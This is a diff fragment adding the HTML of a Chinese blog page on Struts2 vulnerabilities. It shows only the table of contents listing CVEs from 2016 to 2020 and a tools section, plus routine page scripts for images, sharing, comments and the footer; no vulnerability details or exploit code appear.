href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-20"><span class="toc-nav-number">5.21.5.</span> <span class="toc-nav-text">漏洞检测</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-20"><span class="toc-nav-number">5.21.6.</span> <span class="toc-nav-text">漏洞修复</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%8F%82%E8%80%83-20"><span class="toc-nav-number">5.21.7.</span> <span class="toc-nav-text">参考</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#CVE-2016-3081"><span class="toc-nav-number">5.22.</span> <span class="toc-nav-text">CVE-2016-3081</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-21"><span class="toc-nav-number">5.22.1.</span> <span class="toc-nav-text">漏洞描述</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4-21"><span class="toc-nav-number">5.22.2.</span> <span class="toc-nav-text">影响范围</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-21"><span class="toc-nav-number">5.22.3.</span> <span class="toc-nav-text">漏洞原理</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%9D%A1%E4%BB%B6-21"><span class="toc-nav-number">5.22.4.</span> <span class="toc-nav-text">漏洞条件</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-21"><span class="toc-nav-number">5.22.5.</span> <span class="toc-nav-text">漏洞检测</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-21"><span class="toc-nav-number">5.22.6.</span> <span class="toc-nav-text">漏洞修复</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%8F%82%E8%80%83-21"><span class="toc-nav-number">5.22.7.</span> <span class="toc-nav-text">参考</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#CVE-2016-3087"><span class="toc-nav-number">5.23.</span> <span class="toc-nav-text">CVE-2016-3087</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-22"><span class="toc-nav-number">5.23.1.</span> <span class="toc-nav-text">漏洞描述</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4-22"><span class="toc-nav-number">5.23.2.</span> <span class="toc-nav-text">影响范围</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-22"><span class="toc-nav-number">5.23.3.</span> <span class="toc-nav-text">漏洞原理</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%9D%A1%E4%BB%B6-22"><span class="toc-nav-number">5.23.4.</span> <span class="toc-nav-text">漏洞条件</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-22"><span class="toc-nav-number">5.23.5.</span> <span class="toc-nav-text">漏洞检测</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-22"><span class="toc-nav-number">5.23.6.</span> <span class="toc-nav-text">漏洞修复</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%8F%82%E8%80%83-22"><span class="toc-nav-number">5.23.7.</span> <span class="toc-nav-text">参考</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#CVE-2016-4438"><span class="toc-nav-number">5.24.</span> <span class="toc-nav-text">CVE-2016-4438</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-23"><span class="toc-nav-number">5.24.1.</span> <span class="toc-nav-text">漏洞描述</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4-23"><span class="toc-nav-number">5.24.2.</span> <span class="toc-nav-text">影响范围</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-23"><span class="toc-nav-number">5.24.3.</span> <span class="toc-nav-text">漏洞原理</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%9D%A1%E4%BB%B6-23"><span class="toc-nav-number">5.24.4.</span> <span class="toc-nav-text">漏洞条件</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-23"><span class="toc-nav-number">5.24.5.</span> <span class="toc-nav-text">漏洞检测</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-23"><span class="toc-nav-number">5.24.6.</span> <span class="toc-nav-text">漏洞修复</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%8F%82%E8%80%83-23"><span class="toc-nav-number">5.24.7.</span> <span class="toc-nav-text">参考</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#CVE-2017-5638"><span class="toc-nav-number">5.25.</span> <span class="toc-nav-text">CVE-2017-5638</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-24"><span class="toc-nav-number">5.25.1.</span> <span class="toc-nav-text">漏洞描述</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4-24"><span class="toc-nav-number">5.25.2.</span> <span class="toc-nav-text">影响范围</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-24"><span class="toc-nav-number">5.25.3.</span> <span class="toc-nav-text">漏洞原理</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%9D%A1%E4%BB%B6-24"><span class="toc-nav-number">5.25.4.</span> <span class="toc-nav-text">漏洞条件</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-24"><span class="toc-nav-number">5.25.5.</span> <span class="toc-nav-text">漏洞检测</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-24"><span class="toc-nav-number">5.25.6.</span> <span class="toc-nav-text">漏洞修复</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%8F%82%E8%80%83-24"><span class="toc-nav-number">5.25.7.</span> <span class="toc-nav-text">参考</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#CVE-2017-5638-1"><span class="toc-nav-number">5.26.</span> <span class="toc-nav-text">CVE-2017-5638</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-25"><span class="toc-nav-number">5.26.1.</span> <span class="toc-nav-text">漏洞描述</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4-25"><span class="toc-nav-number">5.26.2.</span> <span class="toc-nav-text">影响范围</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-25"><span class="toc-nav-number">5.26.3.</span> <span class="toc-nav-text">漏洞原理</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%9D%A1%E4%BB%B6-25"><span class="toc-nav-number">5.26.4.</span> <span class="toc-nav-text">漏洞条件</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-25"><span class="toc-nav-number">5.26.5.</span> <span class="toc-nav-text">漏洞检测</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-25"><span class="toc-nav-number">5.26.6.</span> <span class="toc-nav-text">漏洞修复</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%8F%82%E8%80%83-25"><span class="toc-nav-number">5.26.7.</span> <span class="toc-nav-text">参考</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#CVE-2017-9791"><span class="toc-nav-number">5.27.</span> <span class="toc-nav-text">CVE-2017-9791</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-26"><span class="toc-nav-number">5.27.1.</span> <span class="toc-nav-text">漏洞描述</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4-26"><span class="toc-nav-number">5.27.2.</span> <span class="toc-nav-text">影响范围</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-26"><span class="toc-nav-number">5.27.3.</span> <span class="toc-nav-text">漏洞原理</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%9D%A1%E4%BB%B6-26"><span class="toc-nav-number">5.27.4.</span> <span class="toc-nav-text">漏洞条件</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-26"><span class="toc-nav-number">5.27.5.</span> <span class="toc-nav-text">漏洞检测</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-26"><span class="toc-nav-number">5.27.6.</span> <span class="toc-nav-text">漏洞修复</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%8F%82%E8%80%83-26"><span class="toc-nav-number">5.27.7.</span> <span class="toc-nav-text">参考</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#CVE-2017-9805"><span class="toc-nav-number">5.28.</span> <span class="toc-nav-text">CVE-2017-9805</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-27"><span class="toc-nav-number">5.28.1.</span> <span class="toc-nav-text">漏洞描述</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4-27"><span class="toc-nav-number">5.28.2.</span> <span class="toc-nav-text">影响范围</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-27"><span class="toc-nav-number">5.28.3.</span> <span class="toc-nav-text">漏洞原理</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%9D%A1%E4%BB%B6-27"><span class="toc-nav-number">5.28.4.</span> <span class="toc-nav-text">漏洞条件</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-27"><span class="toc-nav-number">5.28.5.</span> <span class="toc-nav-text">漏洞检测</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-27"><span class="toc-nav-number">5.28.6.</span> <span class="toc-nav-text">漏洞修复</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%8F%82%E8%80%83-27"><span class="toc-nav-number">5.28.7.</span> <span class="toc-nav-text">参考</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#CVE-2017-12611"><span class="toc-nav-number">5.29.</span> <span class="toc-nav-text">CVE-2017-12611</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-28"><span class="toc-nav-number">5.29.1.</span> <span class="toc-nav-text">漏洞描述</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4-28"><span class="toc-nav-number">5.29.2.</span> <span class="toc-nav-text">影响范围</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-28"><span class="toc-nav-number">5.29.3.</span> <span class="toc-nav-text">漏洞原理</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%9D%A1%E4%BB%B6-28"><span class="toc-nav-number">5.29.4.</span> <span class="toc-nav-text">漏洞条件</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-28"><span class="toc-nav-number">5.29.5.</span> <span class="toc-nav-text">漏洞检测</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-28"><span class="toc-nav-number">5.29.6.</span> <span class="toc-nav-text">漏洞修复</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%8F%82%E8%80%83-28"><span class="toc-nav-number">5.29.7.</span> <span class="toc-nav-text">参考</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#CVE-2018-11776"><span class="toc-nav-number">5.30.</span> <span class="toc-nav-text">CVE-2018-11776</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-29"><span class="toc-nav-number">5.30.1.</span> <span class="toc-nav-text">漏洞描述</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4-29"><span class="toc-nav-number">5.30.2.</span> <span class="toc-nav-text">影响范围</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-29"><span class="toc-nav-number">5.30.3.</span> <span class="toc-nav-text">漏洞原理</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%9D%A1%E4%BB%B6-29"><span class="toc-nav-number">5.30.4.</span> <span class="toc-nav-text">漏洞条件</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-29"><span class="toc-nav-number">5.30.5.</span> <span class="toc-nav-text">漏洞检测</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-29"><span class="toc-nav-number">5.30.6.</span> <span class="toc-nav-text">漏洞修复</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%8F%82%E8%80%83-29"><span class="toc-nav-number">5.30.7.</span> <span class="toc-nav-text">参考</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#CVE-2019-0230"><span class="toc-nav-number">5.31.</span> <span class="toc-nav-text">CVE-2019-0230</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-30"><span class="toc-nav-number">5.31.1.</span> <span class="toc-nav-text">漏洞描述</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4-30"><span class="toc-nav-number">5.31.2.</span> <span class="toc-nav-text">影响范围</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-30"><span class="toc-nav-number">5.31.3.</span> <span class="toc-nav-text">漏洞原理</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%9D%A1%E4%BB%B6-30"><span class="toc-nav-number">5.31.4.</span> <span class="toc-nav-text">漏洞条件</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-30"><span class="toc-nav-number">5.31.5.</span> <span class="toc-nav-text">漏洞检测</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-30"><span class="toc-nav-number">5.31.6.</span> <span class="toc-nav-text">漏洞修复</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%8F%82%E8%80%83-30"><span class="toc-nav-number">5.31.7.</span> <span class="toc-nav-text">参考</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#CVE-2020-17530"><span class="toc-nav-number">5.32.</span> <span class="toc-nav-text">CVE-2020-17530</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-31"><span class="toc-nav-number">5.32.1.</span> <span class="toc-nav-text">漏洞描述</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4-31"><span class="toc-nav-number">5.32.2.</span> <span class="toc-nav-text">影响范围</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-31"><span class="toc-nav-number">5.32.3.</span> <span class="toc-nav-text">漏洞原理</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%9D%A1%E4%BB%B6-31"><span class="toc-nav-number">5.32.4.</span> <span class="toc-nav-text">漏洞条件</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-31"><span class="toc-nav-number">5.32.5.</span> <span class="toc-nav-text">漏洞检测</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-31"><span class="toc-nav-number">5.32.6.</span> <span class="toc-nav-text">漏洞修复</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%8F%82%E8%80%83-31"><span class="toc-nav-number">5.32.7.</span> <span class="toc-nav-text">参考</span></a></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#Tools"><span class="toc-nav-number">6.</span> <span class="toc-nav-text">Tools</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#k8s"><span class="toc-nav-number">6.1.</span> <span class="toc-nav-text">k8s</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#Struts2-Scan"><span class="toc-nav-number">6.2.</span> <span class="toc-nav-text">Struts2-Scan</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#PoC"><span class="toc-nav-number">6.3.</span> <span class="toc-nav-text">PoC</span></a></li></ol></li></ol>
+    
+  </div>
+</aside>
+
+  
+  <!-- Catalog END -->
+</main>
+
+<script>
+  (function () {
+    var url = 'http://example.com/2021/02/26/Struts2漏洞汇总/';
+    var banner = ''
+    if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
+      $('#article-banner').css({
+        'background-image': 'url(' + banner + ')'
+      })
+    } else {
+      $('#article-banner').geopattern(url)
+    }
+    $('.header').removeClass('fixed-header')
+
+    // error image
+    $(".markdown-content img").on('error', function() {
+      $(this).attr('src', 'http://www.si1ent.xyz/css/images/logo.png')
+      $(this).css({
+        'cursor': 'default'
+      })
+    })
+
+    // zoom image
+    $(".markdown-content img").on('click', function() {
+      var src = $(this).attr('src')
+      if (src !== 'http://www.si1ent.xyz/css/images/logo.png') {
+        var imageW = $(this).width()
+        var imageH = $(this).height()
+
+        var zoom = ($(window).width() * 0.95 / imageW).toFixed(2)
+        zoom = zoom < 1 ? 1 : zoom
+        zoom = zoom > 2 ? 2 : zoom
+        var transY = (($(window).height() - imageH) / 2).toFixed(2)
+
+        $('body').append('<div class="image-view-wrap"><div class="image-view-inner"><img src="'+ src +'" /></div></div>')
+        $('.image-view-wrap').addClass('wrap-active')
+        $('.image-view-wrap img').css({
+          'width': `${imageW}`,
+          'transform': `translate3d(0, ${transY}px, 0) scale3d(${zoom}, ${zoom}, 1)`
+        })
+        $('html').css('overflow', 'hidden')
+
+        $('.image-view-wrap').on('click', function() {
+          $(this).remove()
+          $('html').attr('style', '')
+        })
+      }
+    })
+  })();
+</script>
+
+
+  <script>
+    var qr = new QRious({
+      element: document.getElementById('share-qrcode'),
+      value: document.location.href
+    });
+  </script>
+
+
+
+  <script>
+    var gitmentConfig = "si1ent";
+    if (gitmentConfig !== 'undefined') {
+      var gitment = new Gitment({
+        id: "Struts2漏洞汇总",
+        owner: "si1ent",
+        repo: "",
+        oauth: {
+          client_id: "",
+          client_secret: ""
+        },
+        theme: {
+          render(state, instance) {
+            const container = document.createElement('div')
+            container.lang = "en-US"
+            container.className = 'gitment-container gitment-root-container'
+            container.appendChild(instance.renderHeader(state, instance))
+            container.appendChild(instance.renderEditor(state, instance))
+            container.appendChild(instance.renderComments(state, instance))
+            container.appendChild(instance.renderFooter(state, instance))
+            return container;
+          }
+        }
+      })
+      gitment.render(document.getElementById('comments'))
+    }
+  </script>
+
+
+
+
+    <div class="scroll-top">
+  <span class="arrow-icon"></span>
+</div>
+    <footer class="app-footer">
+  <p class="copyright">
+    &copy; 2022 | Proudly powered by <a href="https://hexo.io" target="_blank">Hexo</a>
+    <br>
+    </p>
+    <a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/?spm=a2c4g.11186623.J_9220772140.115.26b47b3dkZ3BnL#/Integrated/index"><p class="copyright">
+    皖ICP备19004273号-1
+  </p>
+    </a>
+</footer>
+<script>
+  function async(u, c) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+</script>
+<script>
+  async("//cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.min.js", function(){
+    FastClick.attach(document.body);
+  })
+</script>
+
+<script>
+  var hasLine = 'true';
+  async("//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js", function(){
+    $('figure pre').each(function(i, block) {
+      var figure = $(this).parents('figure');
+      if (hasLine === 'false') {
+        figure.find('.gutter').hide();
+      }
+      var lang = figure.attr('class').split(' ')[1] || 'code';
+      var codeHtml = $(this).html();
+      var codeTag = document.createElement('code');
+      codeTag.className = lang;
+      codeTag.innerHTML = codeHtml;
+      $(this).attr('class', '').empty().html(codeTag);
+      figure.attr('data-lang', lang.toUpperCase());
+      hljs.highlightBlock(block);
+    });
+  })
+</script>
+<!-- Baidu Tongji -->
+
+
+<script src="/js/script.js"></script>
+
+
+  </body>
+</html>
